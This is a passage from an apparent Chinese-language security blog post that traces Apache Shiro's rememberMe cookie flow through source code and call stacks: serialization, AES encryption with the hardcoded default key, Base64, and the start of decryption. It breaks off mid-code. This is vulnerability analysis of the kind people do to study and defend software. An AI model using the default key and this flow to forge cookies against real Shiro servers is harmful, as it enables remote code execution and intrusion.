(org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">832</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>从正向开始分析，从onSuccessfulLogin方法开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    <span class="comment">//清除之前的身份信息</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="comment">//检查登入令牌是否请求了“Remeber Me”功能</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        <span class="comment">//根据相关的信息生成新的身份信息</span></span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以进入isRememberMe方法查看如何进行判断的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isRememberMe</span><span class="params">(AuthenticationToken token)</span> &#123;</span><br><span class="line">    <span class="comment">// 第一个条件检查的是令牌是否为空</span></span><br><span class="line">    <span class="comment">// 第二个条件检查的是登录令牌token是否是RememberMeAuthenticationToken类型实例</span></span><br><span class="line">    <span class="comment">// 第三个条件是进一步调用实例中的isRememberMe方法</span></span><br><span class="line">    <span class="keyword">return</span> token != <span class="literal">null</span> &amp;&amp; (token <span class="keyword">instanceof</span> RememberMeAuthenticationToken) &amp;&amp;</span><br><span class="line">            ((RememberMeAuthenticationToken) token).isRememberMe();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>token是UsernamePasswordToken类对象，所以进入到此对象的isRememberMe方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isRememberMe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> rememberMe;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829171009.png"><br>进入if条件中的rememberIdentity函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 从身份验证信息中提取用户的主体身份信息</span></span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    <span class="comment">// 将用户的主体身份信息保存起来</span></span><br><span class="line">    rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202529.png"><br>进入重载的rememberIdentity函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="comment">// 将主体身份信息转换为字节数组（byte[]）的形式</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="comment">// 将序列化后的身份信息保存起来，以便在下次需要恢复用户身份时使用</span></span><br><span class="line">    rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202955.png"><br>这里的关键是进入convertPrincipalsToBytes方法，通过这个函数将身份的相关信息转换成了byte数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="comment">// 先将身份信息进行序列化，转换成字节流</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    <span class="comment">// getCipherService获取密码服务的实例</span></span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 对序列化后的字节流进行加密</span></span><br><span class="line">        bytes = encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先来了解getCipherService函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> CipherService <span class="title function_">getCipherService</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> cipherService;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是返回一个类的属性，查看该类的构造函数观察对应属性的赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个默认的序列化器</span></span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="comment">// 创建一个AES加密算法的密码服务</span></span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="comment">// 设置密钥</span></span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据类名应该可以得知这里使用的是AES算法，从上下文可以获得固定在源码中的密钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>获取到加密的服务之后，进入if中调用encrypt函数进行加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="comment">// 序列化后的身份信息</span></span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="comment">// 获取密码服务的实例</span></span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用加密算法，对序列化的数据进行加密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829211026.png"><br>进入encrypt方法,这里进入的是JcaCipherService类的encrypt方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] plaintext, <span class="type">byte</span>[] key)</span> &#123;</span><br><span class="line">    <span class="comment">// 用于存储初始化向量</span></span><br><span class="line">    <span class="type">byte</span>[] ivBytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 用于检查是否启用了生成初始化向量的选项</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">generate</span> <span class="operator">=</span> isGenerateInitializationVectors(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">        <span class="comment">// 生成初始化向量</span></span><br><span class="line">        ivBytes = generateInitializationVector(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (ivBytes == <span class="literal">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Initialization vector generation is enabled - generated vector&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cannot be null or empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用重载的加密方法</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829212305.png"><br>初始iv是如何生成的？<br>查看generateInitializationVector方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] generateInitializationVector(<span class="type">boolean</span> streaming) &#123;</span><br><span class="line">    <span class="comment">// 获取初始向量的大小</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;initializationVectorSize property must be greater than zero.  This number is &quot;</span> +</span><br><span class="line">                <span class="string">&quot;typically set in the &quot;</span> + CipherService.class.getSimpleName() + <span class="string">&quot; subclass constructor.  &quot;</span> +</span><br><span class="line">                <span class="string">&quot;Also check your configuration to ensure that if you are setting a value, it is positive.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始向量大小需要是8的倍数   BITS_PER_BYTE表示8</span></span><br><span class="line">    <span class="keyword">if</span> (size % BITS_PER_BYTE != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;initializationVectorSize property must be a multiple of 8 to represent as a byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 字节数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeInBytes</span> <span class="operator">=</span> size / BITS_PER_BYTE;</span><br><span class="line">    <span class="comment">// 创建字节数组</span></span><br><span class="line">    <span class="type">byte</span>[] ivBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[sizeInBytes];</span><br><span class="line">    <span class="comment">// 获取一个安全的随机数生成器</span></span><br><span class="line">    <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> ensureSecureRandom();</span><br><span class="line">    <span class="comment">// 使用随机数生成器生成随机字节</span></span><br><span class="line">    random.nextBytes(ivBytes);</span><br><span class="line">    <span class="keyword">return</span> ivBytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看向量大小的生成getInitializationVectorSize方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getInitializationVectorSize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> initializationVectorSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回一个属性值，查看其构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">JcaCipherService</span><span class="params">(String algorithmName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.hasText(algorithmName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;algorithmName argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.algorithmName = algorithmName;</span><br><span class="line">    <span class="built_in">this</span>.keySize = DEFAULT_KEY_SIZE;</span><br><span class="line">    <span class="comment">// DEFAULT_KEY_SIZE指128</span></span><br><span class="line">    <span class="built_in">this</span>.initializationVectorSize = DEFAULT_KEY_SIZE; <span class="comment">//default to same size as the key size (a common algorithm practice)</span></span><br><span class="line">    <span class="built_in">this</span>.streamingBufferSize = DEFAULT_STREAMING_BUFFER_SIZE;</span><br><span class="line">    <span class="built_in">this</span>.generateInitializationVectors = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上所述，这里的iv是随机生成的16位字节<br>进入重载的encrypt方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] plaintext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">boolean</span> prependIv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="comment">// 加密模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MODE</span> <span class="operator">=</span> javax.crypto.Cipher.ENCRYPT_MODE;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prependIv &amp;&amp; iv != <span class="literal">null</span> &amp;&amp; iv.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 加密操作</span></span><br><span class="line">        <span class="type">byte</span>[] encrypted = crypt(plaintext, key, iv, MODE);</span><br><span class="line"></span><br><span class="line">        output = <span class="keyword">new</span> <span class="title class_">byte</span>[iv.length + encrypted.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now copy the iv bytes + encrypted bytes into one output array:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// iv bytes:</span></span><br><span class="line">        System.arraycopy(iv, <span class="number">0</span>, output, <span class="number">0</span>, iv.length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// + encrypted bytes:</span></span><br><span class="line">        System.arraycopy(encrypted, <span class="number">0</span>, output, iv.length, encrypted.length);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        output = crypt(plaintext, key, iv, MODE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Incoming plaintext of size &quot;</span> + (plaintext != <span class="literal">null</span> ? plaintext.length : <span class="number">0</span>) + <span class="string">&quot;.  Ciphertext &quot;</span> +</span><br><span class="line">                <span class="string">&quot;byte array is size &quot;</span> + (output != <span class="literal">null</span> ? output.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将加密结果转换为 ByteSource 对象并返回</span></span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入crypt函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(<span class="type">byte</span>[] bytes, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || key.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;key argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    javax.crypto.<span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> initNewCipher(mode, key, iv, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> crypt(cipher, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实就是AES内部的加密细节了<br>encrypt函数执行到最后结果如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829220941.png"><br>得到加密后的结果，回到rememberIdentity函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224210.png"><br>进入rememberSerializedIdentity函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">    cookie.setValue(base64);</span><br><span class="line">    cookie.saveTo(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829224409.png"><br>设置cooike成功<br><strong>总结</strong>：身份信息进行序列化——&gt;AES加密——&gt;Base64加密——&gt;cookie中的remeberMe</p>
<h3 id="remeberMe的解析过程"><a href="#remeberMe的解析过程" class="headerlink" title="remeberMe的解析过程"></a>remeberMe的解析过程</h3><p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">decrypt:<span class="number">386</span>, JcaCipherService (org.apache.shiro.crypto)</span><br><span class="line">decrypt:<span class="number">382</span>, JcaCipherService (org.apache.shiro.crypto)</span><br><span class="line">decrypt:<span class="number">489</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:<span class="number">429</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">396</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:<span class="number">342</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:<span class="number">846</span>, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:<span class="number">148</span>, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:<span class="number">292</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:<span class="number">359</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">832</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>使用前面生成的remeberMe的cookie值进行请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X GET -H <span class="string">&quot;cookie:rememberMe=jCmif8/p5A+C+p5PwHTlOWNsUCikdqRc5mLEb1PsaBvuroIawHP/03Zenr4iVKL3RsWjWCt3YkFsVXQKf4pkQLwPRUa4M9gzUuEmUZfR8U2YsXXETs8oYxatlg7IovW9/eM/jyqjWZ5sYQT7me+DY2lDSUasvbZofwaApRLrDw0xxM79I6XNpz0nlCkuAdWsZvS8ghAZyByl/UAWITIxbeNF6vWnwjsTcHtskaZ0QBwh4BGreNrVAh0dbl5Ah8U3BEID3yndJ9y7lbIT/QQTvfFgim6Rjh3TQaFIC6Dt+rxO782rJ4dkswpf3UOih35I47Vm/LcJzrvnxNlMQyPa8ttHMZEVsfh8mSKAeePyzkkM5j6yeY764AAH160CD1e8DXJlz6gyo+1bCJqmvDgPPfoIRPCVPsNlDUipANkGqYZvk9A8diXf3EiOuuvebbFuPsmYPsFWdiVnoV6Q9z+iHfO19mojLNsDHdeyQEHYE5FvsPrqPGnsaJc9NUBqNpOb; Phpstorm-10d910bb=a6bc0397-210c-4145-96b8-e9aedf363376&quot;</span> http://localhost:8090/samples_web_war/</span><br></pre></td></tr></table></figure>

<p>在AbstractRememberMeManager类的getRememberedPrincipals方法中下断点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取被记住的主体身份的序列化字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 将序列化字节数组转换为主体身份集合</span></span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入getRememberedSerializedIdentity函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Servlet请求对象</span></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="comment">// 获取Servlet响应对象</span></span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">    <span class="comment">// 从请求中读取 cookie 的值</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 